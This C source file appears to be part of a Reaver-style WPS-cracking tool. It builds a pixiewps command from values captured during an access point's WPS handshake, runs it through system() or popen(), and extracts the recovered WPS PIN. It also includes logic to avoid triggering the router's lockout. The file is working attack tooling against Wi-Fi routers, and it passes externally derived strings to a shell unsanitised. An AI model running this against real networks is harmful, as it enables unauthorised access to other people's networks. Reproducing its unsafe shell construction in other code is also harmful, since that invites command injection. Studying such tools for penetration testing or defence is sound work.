#include <sys/types.h>
#include "pixie.h"
#include "globule.h"
#include <stdio.h>
#include <stdlib.h>

struct pixie pixie = {0};

void pixie_format(const unsigned char *in, unsigned len, char *outbuf) {
	unsigned i;
	char *out = outbuf;
	for(i = 0; i < len; i++, out+=2) {
		sprintf(out, "%02x", in[i]);
	}
	if(i) *out = 0;
}

void pixie_attack(void) {
	struct pixie *p = &pixie;
	int dh_small = get_dh_small();

	if(p->do_pixie) {
		char cmd[4096];
		snprintf(cmd, sizeof cmd,
		"%s -e %s -s %s -z %s -a %s -n %s %s %s",
		((p->do_pixie == 2) ? p->wrapper : "pixiewps"),
		p->pke, p->ehash1, p->ehash2, p->authkey, p->enonce,
		dh_small ? "-S" : "-r" , dh_small ? "" : p->pkr);
		printf("executing %s\n", cmd);
		if (p->do_pixie == 2) {
			/* check pixiewps attack (--force option) was executed */
			if (p->do_pixie == get_do_pixie_status() && strcmp(p->wrapper, "pixie-wrapper")==0) {
				/* Cancel pixiewps attack */
				p->do_pixie = 0;
				pixie_free();
				printf("[!] Ignoring pixiewps attack (pixie-wrapper)\n");
				return;
			}
			if (pixie_wrapper(cmd) != EXIT_SUCCESS) {
				exit(EXIT_FAILURE);
			}
		}
		else {
			exit(system(cmd));
		}
	}
}

void pixie_free() {
	PIXIE_FREE(authkey);
	PIXIE_FREE(pkr);
	PIXIE_FREE(pke);
	PIXIE_FREE(enonce);
	PIXIE_FREE(ehash1);
	PIXIE_FREE(ehash2);
	PIXIE_FREE(wrapper);
	PIXIE_FREE(pin);
}

/**
 * Call a wrapper to run pixiewps, set the discovered pin to pixie.pin if pixiewps attack is successful
 * 
 * The wrapper could be implemented in any language which needs to follow the following conventions:
 * 1) arguments are passed precisely as for pixiewps
 * 2) on failure, non-zero exit status is returned
 * 3) on success, exactly one line is printed to stdout, containing the found pin and a trailing newline character,
 *    in case of null pin, only a newline character '\n' would be returned and exit status 0 is returned.
 * 
 * @params char* cmd The command line to call a wrapper with the arguments
 * 
 * @return int
 */
int pixie_wrapper(char *cmd) {
	FILE *fp;
	char *str_pin = NULL;
	char msg[256];
	int ret_val = EXIT_FAILURE;
	int len;

	fp = popen(cmd, "r");
	if (fp != NULL) {
		while (fgets(msg, 256, fp) != NULL) {
			printf("%s", msg);
			/* Capture pin if the wrapper not following the specifications */
			if(strstr(msg, "[+] WPS pin: ") != NULL) {
				str_pin = malloc(10);
				if (str_pin) {
					str_pin[0] = '\0';
					if (strstr(msg, "empty") == NULL) {
						strncpy(str_pin, msg+15, 8);
						str_pin[8] = '\0';
					}
				}
			}
		}
		if (get_do_pixie_status() < pixie.do_pixie) {
			set_do_pixie_status(pixie.do_pixie);
		}
		ret_val = pclose(fp);
	}
	else {
		perror("popen");
	}

	if(ret_val == EXIT_SUCCESS) {
		/* In case of the wrapper not following the specifications */
		if (str_pin) {
			strcpy(msg, str_pin);
		}
		/* pin found, remove '\r' or '\n' */
		len = strlen(msg);
		while(len>0 && (msg[len-1]=='\n' || msg[len-1]=='\r')){
			msg[--len] = '\0';
		}
		PIXIE_SET(pin, msg);
		printf("[+] Pin found: \"%s\"\n", pixie.pin);
	}
	else {
		pixie.do_pixie = 0;
		pixie_free();
		printf("[-] WPS pin not found!\n");
	}
	if (str_pin) free(str_pin);

	return ret_val;
}

/* Check the pixie attack is need to avoid AP lock status */
int pixie_is_avoid_ap_lock() {
	if (pixie.do_pixie) {
		if (pixie.pin && strcmp(get_pin(), pixie.pin) != 0) {
			return 1;
		}
	}

	return 0;
}
